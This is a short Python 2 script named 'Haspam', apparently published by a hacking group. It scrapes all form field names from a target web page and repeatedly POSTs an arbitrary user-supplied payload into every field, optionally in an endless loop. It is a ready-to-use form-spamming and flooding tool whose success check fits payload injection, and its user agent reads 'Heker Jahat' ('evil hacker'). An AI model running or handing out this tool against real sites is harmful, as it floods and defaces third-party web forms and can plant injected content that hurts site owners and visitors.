#!/usr/bin/python2
# Haspam - Auto Get Parameter Spam HTTP Post Data
# Copyright (c)2019 - Afrizal F.A - ICWR-TECH

import re, sys, requests

print """
######################
# Haspam - ICWR-TECH #
######################
"""

user_x="Heker Jahat"
target=sys.argv[1]
pyld_x=sys.argv[2]
get_param=requests.get(url=target, headers={ "User-Agent" : user_x }).content
param_x=re.findall("name=\"(.+?)\"", get_param)
x={ "" : ""}
for param_x in param_x :
   if not param_x :
      continue

   dict={ param_x : pyld_x }
   x.update(dict)
   
if sys.argv[3] == "nolimit" :
   while True :
      if re.search(pyld_x, requests.post(url=target, data=x, headers={ "User-Agent" : user_x }).content) :
         print "[+] Spammed Success To : " + target
      else :
         print "[-] Spammed Failed To : " + target
      
else :
   for i in range(0, int(sys.argv[3])) :
      if re.search(pyld_x, requests.post(url=target, data=x, headers={ "User-Agent" : user_x }).content) :
         print "[+] Spammed Success To : " + target
      else :
         print "[-] Spammed Failed To : " + target